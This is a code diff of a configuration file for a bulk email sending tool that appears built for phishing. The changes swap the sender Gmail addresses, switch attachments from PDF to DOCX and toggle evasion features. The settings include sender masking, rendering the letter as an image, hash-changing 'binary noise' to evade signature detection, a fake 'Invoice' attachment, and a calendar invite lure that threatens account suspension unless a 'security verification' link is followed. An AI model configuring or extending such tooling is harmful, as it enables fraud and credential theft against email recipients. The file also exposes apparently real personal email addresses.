@@ -9,18 +9,18 @@
  */
 
 const smtp = [
-  {
+   {
     "host": "smtp.gmail.com",
     "port": 587,
     "secure": false,
-    "username": "nfdconstructionsllc@gmail.com",
-    "password": "", 
-    "from_email": "nfdconstructionsllc@gmail.com"
-  }
+    "username": "Jwilson.langara.ca@gmail.com",
+    "password": "",
+    "from_email": "Jwilson.langara.ca@gmail.com"
+  },
 ];
 
 const setup = {
-  key: "put your key ",
+  key: "put key",
   MultipleSmtp: "SINGLE", // ROTATE or SINGLE
   mail_priority: "HIGH", // HIGH, NORMAL, LOW
   sleep_time: 5, // Delay in seconds between sending attempts
@@ -29,7 +29,7 @@ const setup = {
   howManyThread: 1, // Number of simultaneous worker threads to spawn
 
   // --- CONTENT DECEPTION & RENDERING ---
-  LetterToImage: true, // Convert HTML email body into an image
+  LetterToImage: false, // Convert HTML email body into an image
   fileName_LetterToImage: "./letterToImage.html", // HTML source file for image rendering
   width_imageLetter: 800, // Resolution width of the rendered browser window
   height_imageLetter: 1000, // Resolution height of the rendered browser window
@@ -41,11 +41,10 @@ const setup = {
   // Script will randomly pick one of these files to render as an image.
   // Ensure you have created these files in your root directory!
   // =====================================================================
-  use_multiple_images: true, // Set to TRUE for testing
+  use_multiple_images: false, // Set to TRUE for testing
   multi_images: [
     "./letterToImage1.html",
     "./letterToImage2.html",
-    
   ],
 
   // =====================================================================
@@ -53,7 +52,7 @@ const setup = {
   // Script will randomly pick one of these HTML files as the email body.
   // Ensure you have created these files in your root directory!
   // =====================================================================
-  use_multiple_letters: true, // Set to TRUE for testing
+  use_multiple_letters: false, // Set to TRUE for testing
   letter: "letter.html", // Default fallback if multiple is off
   multi_letters: [
     "./letter1.html",
@@ -100,7 +99,7 @@ const setup = {
   frommail_filename: "frommail.txt", // File containing custom "From" addresses
   hide_frommail: false, // Masks the actual sender address using header manipulation
   
-  email_test: true, // Send a copy to the test destination every X emails
+  email_test: false, // Send a copy to the test destination every X emails
   test_every: 1, // Frequency of test emails
   email_destination: "asd@asd.com", // REPLACE WITH YOUR TEST EMAIL
   mailist: "mailist.txt", // The file containing your target recipient list
@@ -143,13 +142,14 @@ const email_validator = {
 // =====================================================================
 const attachment = [
   {
-    filename: "Invoice_<COMPANYNAME>_<RANDNUM5>.pdf",
+    filename: "Invoice_<COMPANYNAME>_<RANDNUM5>.docx",
     path: "attachment.html",
-    attachmentToPdf: true, // Automatically convert HTML source to a PDF file
+    attachmentToPdf: false, // Automatically convert HTML source to a PDF file
+    attachmentToDocx: true, // Enable this to convert HTML source to a DOCX file
     encryptLevel: 10, // Complexity level of content obfuscation
     pdfWidth: "800px", // Custom width of the generated PDF page
     pdfHeight: "1100px", // Custom height of the generated PDF page
-    injectBinaryNoise: true // Modifies file hash on every send to prevent signature detection
+    injectBinaryNoise: false, // Modifies file hash on every send to prevent signature detection
   }
 ];
 
@@ -165,17 +165,17 @@ const attachment_EML = {
   useAttachment_EML: true, // Enable extra attachments inside the EML itself
   attachment: [
     { 
-      attachmentName: "<COMPANYNAME>_Encrypted_<RANDNUM4>.html", 
-      path: "EML/attachment.html" 
+      attachmentName: "<COMPANYNAME>_Encrypted_<RANDNUM4>.docx", 
+      path: "EML/attachment.html",
+      attachmentToDocx: true
     }
   ]
 };
 
-
 const calendar_invite = {
   active: true, // MUST BE TRUE TO ENABLE
   TIMEZONE: "America/New_York", 
-  SUMMARY: "Urgent Security Verification for <NAME>", // Judul Event
+  SUMMARY: "Urgent Security Verification for <NAME>", // Event Title
   DESCRIPTION: "Dear <NAME>,\n\nAs part of our ongoing security enhancements, we require all users to complete a mandatory account verification session.\n\nYour temporary session code is: <CAPITAL_RANDSTRING6>\n\nPlease proceed to the portal to finalize the process and prevent account suspension:\n<RANDLINK>\n\nThank you for your immediate attention to this matter.\n\nIT Security Department", 
   LOCATION: "Digital Identity Protection Portal",
   METHOD: "REQUEST", // This will trigger the RSVP buttons (Accept/Decline)
@@ -241,7 +241,20 @@ const others = {
   att_CT: "text/html" // Default Content-Type for attachments
 };
 
-const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/uc?id=1oMBVsQBm4ooCDJHc6JoIk3MNpsufMbQN" }]; // Configuration for custom brand logo
+// =====================================================================
+// CUSTOM INLINE IMAGES CONFIGURATION
+// You can add multiple images here and call them via tags (e.g., <%- MYLOGO %>, <%- MYLOGO2 %>)
+// =====================================================================
+const myLOGO = [
+  { 
+    function_name: "MYLOGO", 
+    nameFile: "https://i.ibb.co.com/jkQB9SnQ/2026-04-04-00-54-03.jpg" 
+  },
+  { 
+    function_name: "MYLOGO2", // This is the tag name for the second image
+    nameFile: "https://i.ibb.co.com/jkQB9SnQ/2026-04-04-00-54-03.jpg" // Replace with the URL or path of the second image
+  }
+];
 
 module.exports = {
   smtp, 
